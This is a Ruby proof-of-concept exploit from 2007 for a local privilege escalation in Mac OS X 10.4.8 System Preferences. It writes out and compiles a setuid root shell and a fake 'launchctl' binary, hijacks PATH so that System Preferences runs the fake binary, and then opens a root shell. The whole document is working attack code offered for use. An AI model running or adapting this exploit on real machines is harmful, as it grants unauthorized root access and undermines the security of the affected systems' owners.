Mac OS X 10.4.8 System Preferences Local Privilege Escalation Exploit
=====================================================================


#!/usr/bin/ruby
# Copyright (c) 2007 Kevin Finisterre <kf_lists [at] digitalmunition.com>
#                    Lance M. Havok   <lmh [at] info-pull.com>
# All pwnage reserved.
#
# "Exploit" for MOAB-21-01-2007: OS X, making root shells easier each day.
#

SHELL_WRAP      = &#039;int main() { system("/bin/sh -i"); return 0; }&#039;
SHELL_PLANT     = &#039;int main() { system("chown root: /tmp/shX; chmod 4755 /tmp/shX"); return 0; }&#039;
PREFS_BINPATH   = &#039;/Applications/System\ Preferences.app/Contents/MacOS/System\ Preferences&#039;

COMMAND_LINE    = "echo &#039;#{SHELL_WRAP}&#039; > /tmp/t.c &&"    +
                  "cc -o /tmp/shX /tmp/t.c &&"            +
                  "echo &#039;#{SHELL_PLANT}&#039; > /tmp/t.c &&"   +
                  "cc -o /tmp/launchctl /tmp/t.c &&"      +
                  &#039;export PATH="/tmp/:$PATH" &&&#039;          +
                  "#{PREFS_BINPATH} &"

def escalate()
  system COMMAND_LINE
  puts "++ Click on Sharing and then click on Windows Sharing..."
  sleep 30 # make sure you have "time"
  system "/tmp/shX" 
end

escalate()




